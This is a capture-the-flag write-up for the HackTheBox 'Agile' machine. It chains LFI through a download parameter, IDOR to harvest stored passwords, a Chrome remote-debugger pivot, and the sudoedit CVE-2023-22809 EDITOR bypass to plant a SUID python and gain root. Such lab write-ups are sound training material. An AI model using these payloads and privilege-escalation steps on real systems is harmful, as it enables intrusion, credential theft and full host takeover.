  ![image](https://user-images.githubusercontent.com/87700008/223168750-f334d680-a040-485d-940b-838827fe3b62.png)

https://app.hackthebox.com/machines/Agile

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I started with a quick rustscan and found only two open ports: 22 and 80.

```
sudo rustscan -a 10.10.11.203 -- -sC -sV -T4 -vv -oN agile_nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCeVL2Hl8/LXWurlu46JyqOyvUHtAwTrz1EYdY5dXVi9BfpPwsPTf+zzflV+CGdflQRNFKPDS8RJuiXQa40xs9o=
|   256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEcaZPDjlx21ppN0y2dNT1Jb8aPZwfvugIeN6wdUH1cK
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the port scan results, I found a new domain "superpass.htb" running on port 80.

I browsed through the website and observed that it is a password manager website.

![image](https://user-images.githubusercontent.com/87700008/223170926-fab167b8-95b5-4e64-a45a-a6ed05027fad.png)

I then ran directory scanning on the domain and found three directories:

```
/download
/static
/vault
```

![image](https://user-images.githubusercontent.com/87700008/223171286-8d0ca373-7533-4988-be1a-5e0fd8949604.png)

I also checked for a VHOST running with the domain, but I didn't find anything. 😕

![image](https://user-images.githubusercontent.com/87700008/223171871-6c16509d-d649-434f-8b9f-fef33dad8736.png)

Next, I started checking the website and registered on it using a random username and password.

There is an option to add a website and username on the homepage of the website, which provides us with a random password. So, I added a random website and username.

![image](https://user-images.githubusercontent.com/87700008/223444148-c85b5076-41de-404c-bf6b-aac42499ef06.png)

After adding the credentials, I exported the file, but before that, I started Burp to check all the requests made while exporting the file.

I found that there is an 'fn' option which might indicate the filename option:

![image](https://user-images.githubusercontent.com/87700008/223445258-430ea32d-9517-4ff6-b614-4e124cf297b0.png)
![image](https://user-images.githubusercontent.com/87700008/223445304-4937b4eb-bb00-4460-bce6-fb6bea8386b5.png)

The 'fn' option might be vulnerable to LFI. So, I tried the OG payload to check for LFI, i.e., '../etc/passwd' and it worked!

![image](https://user-images.githubusercontent.com/87700008/223446140-3f5dfff5-6a06-4996-881b-480c7be33e3c.png)

Now, I am confirmed that the website is vulnerable to LFI. I continued enumeration and in the downloads directory, I found some error messages, with the last one taking input after login, using the 'fn' function, and then sharing the data in CSV format.

![image](https://user-images.githubusercontent.com/87700008/223448453-1162fedb-4b3d-48bc-9fd6-3e95c4eeeee8.png)

Also, in the error message, there is a Python file mentioned with the file path:
    
    /app/app/superpass/views/vault_views.py

I tried to extract the file using LFI and successfully obtained the source code of "vault_views.py".

![image](https://user-images.githubusercontent.com/87700008/223449269-fcca2824-21a9-4341-bfb1-0c359b413453.png)

Here is the full source code of the file :

```
import flask
import subprocess
from flask_login import login_required, current_user
from superpass.infrastructure.view_modifiers import response
import superpass.services.password_service as password_service
from superpass.services.utility_service import get_random
from superpass.data.password import Password


blueprint = flask.Blueprint('vault', __name__, template_folder='templates')


@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    print(f'{passwords=}')
    return {'passwords': passwords}


@blueprint.get('/vault/add_row')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def add_row():
    p = Password()
    p.password = get_random(20)
    #import pdb;pdb.set_trace()
    return {"p": p}


@blueprint.get('/vault/edit_row/<id>')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def get_edit_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.post('/vault/add_row')
@login_required
def add_row_post():
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        return ''

    p = password_service.add_password(site, username, password, current_user.id)
    return flask.render_template('vault/partials/password_row.html', p=p)


@blueprint.post('/vault/update/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def update(id):
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        flask.abort(500)

    p = password_service.update_password(id, site, username, password)

    return {"p": p}


@blueprint.delete('/vault/delete/<id>')
@login_required
def delete(id):
    password_service.delete_password(id)
    return ''


@blueprint.get('/vault/export')
@login_required
def export():
    if current_user.has_passwords:        
        fn = password_service.generate_csv(current_user)
        return flask.redirect(f'/download?fn={fn}', 302)
    return "No passwords for user"
    

@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```
By Looking at the source code of the file there is a line which is returning the password based on the current user id, so this might be the case of IDOR :

![image](https://user-images.githubusercontent.com/87700008/223451509-cc1817cd-213d-4439-b4d3-5a2201b25b8f.png)

I copied the header "/vault/row/id" and sent the response from Burp by manually changing the id from 0 to 9.

For id 1 and 2 I got blank page but for id 3 I received the response with the password of hackthebox, this confirmed that the page is vulnerable to IDOR.

![image](https://user-images.githubusercontent.com/87700008/223452139-62fc2d1b-c21d-41fe-9471-4a46072da96f.png)

I sent the request to Intruder to check further responses up to number 9.

![image](https://user-images.githubusercontent.com/87700008/223453168-4915baaa-41dd-47bc-80b2-868f8b2a4967.png)
![image](https://user-images.githubusercontent.com/87700008/223453234-209001f3-c5e6-47ad-95eb-370fb4a48b73.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

At the id no. 8 I got the password for the agile user 'corum' & logged in via SSH.

![image](https://user-images.githubusercontent.com/87700008/223455451-b09b196a-138e-4fb8-a0f6-3e425c827807.png)

![image](https://user-images.githubusercontent.com/87700008/223455616-931e8afd-c23a-4daf-955b-772b2aa609cd.png)

Got the user flag at the corum home directory. (pwn3d! 🙂)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation :

I attempted to perform manual enumeration to find any potential privilege escalation vectors, but I did not find much. I then ran Linpeas to help identify any possible vectors, but unfortunately, it also did not reveal any useful information. 😕

Next, I started analyzing the running processes and discovered that an uncommon service was running on port 41829.

![image](https://user-images.githubusercontent.com/87700008/223473444-0059787e-5cc5-4baf-b392-75241d34c18d.png)

To further investigate, I identified that the service was the Chrome Remote Debugger service. This could potentially provide an opportunity for privilege escalation, and I continued to examine the service and look for any potential vulnerabilities or misconfigurations.

![image](https://user-images.githubusercontent.com/87700008/223473716-cede6dac-dcc5-4e69-a16d-00fd9e54ddf4.png)

```
runner    103720  0.2  2.7 33989976 108756 ?     Sl   15:39   0:01                      \_ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.0d45bf --window-size=1420,1080 data:,
runner    103789  0.4  3.2 1184726304 129988 ?   Sl   15:39   0:02                          |       \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=103727 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1678194484251053 --launch-time-ticks=9058043149 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,4872513971917540447,3874534238217940035,131072 --disable-features=PaintHolding
```

To access the contents running on port 41829, I attempted port forwarding.
To perform port forwarding I tried 'Chisel' but for some reason the Agile box is removing the chisel automatically from the system. 

I then attempted to perform port forwarding using SSH:

    ssh corum@10.10.11.203 -L 41829:127.0.0.1:41829
    
Since the service is running the Chrome remote debugging, we can directly open the Chrome/Chromium browser and access the dev tool tab using "chrome://inspect". In the configure section, we can add our listening port 41829 to see the content.

![image](https://user-images.githubusercontent.com/87700008/223483817-40753927-e43a-4f1e-9261-d037cc8f7287.png)

After adding the connection we can see there is a test environment visible "test.superpass.htb" in the page.

![image](https://user-images.githubusercontent.com/87700008/223484401-611d7637-5f22-447f-b778-a5a0f50fea41.png)

Upon clicking on 'inspect', I opened a new session and accessed the '/vault' section where I found two passwords, one of which belonged to 'Edwards'.

![image](https://user-images.githubusercontent.com/87700008/223485436-54cc8cad-8145-43ce-a5a4-8a7994400564.png)

I used the gathered credentials to login via SSH & logged in successfully. 

![image](https://user-images.githubusercontent.com/87700008/223509592-b03d7aa7-ff59-4850-b9fe-e8a007f179d9.png)

After checking the sudoers level privileges, I discovered that we can open two files with sudoedit as 'dev_admin'.

![image](https://user-images.githubusercontent.com/87700008/223511132-50d1c24d-5b8a-471a-bacd-afdff0f5e283.png)


To identify processes running with root privileges, I executed 'pspy' and discovered one such process.

![image](https://user-images.githubusercontent.com/87700008/223759645-8711fd48-ede5-4f5e-a6d4-d178db385a21.png)

    CMD: UID=0    PID=142549 | /bin/bash -c source /app/venv/bin/activate
    
I observed that the process is also owned by "dev_admin" from which we can run specific commands.

![image](https://user-images.githubusercontent.com/87700008/223760224-8b09a848-2280-43a5-9336-67fc9ed15415.png)

At this stage, I was looking for ways to escalate my privileges and found a vulnerability in the sudo version is vulnerable "[Sudoedit bypass in Sudo <= 1.9.12p1
CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)"

As per the blog "This behavior leads to confusion when injecting an extra double dash in the previous environment variables used to look up the editor."

    EDITOR='vim -- /path/to/extra/file'
    
By modifying the EDITOR environment variable, we can open an additional file in the same way.

We export the variable as indicated by opening /app/venv/bin/activate as an extra file :

    export EDITOR='vim -- /app/venv/bin/activate'
    
We can open one of the 2 files that allows us to open as dev_admin at the sudoers level.

![image](https://user-images.githubusercontent.com/87700008/223765305-3cebc26b-fed4-4a7d-877f-32ec1ea76cd9.png)

To modify the file, we added a command at the beginning to grant suid permissions to Python.

```
# This file must be used with "source bin/activate" *from bash*
# you cannot run it directly

chmod u+s /usr/bin/python3
```

The save the file using 'wq!' and after sometime the file will be executed and python will be suid.

![image](https://user-images.githubusercontent.com/87700008/223783591-a87decb5-eb30-4144-94cc-9742cedccd7c.png)

Using Python3, we set our uid to '0' and then used 'su' to become root :

```
edwards@agile:~$ python3 -q
>>> import os
>>> os.setuid(0)
>>> os.system("su")
root@agile:/home/edwards# id
uid=0(root) gid=0(root) groups=0(root)
root@agile:/home/edwards# hostname && id
agile
uid=0(root) gid=0(root) groups=0(root)
root@agile:/home/edwards# 
```

![image](https://user-images.githubusercontent.com/87700008/223784014-999ac434-7544-4b19-a89d-03481909ab86.png)

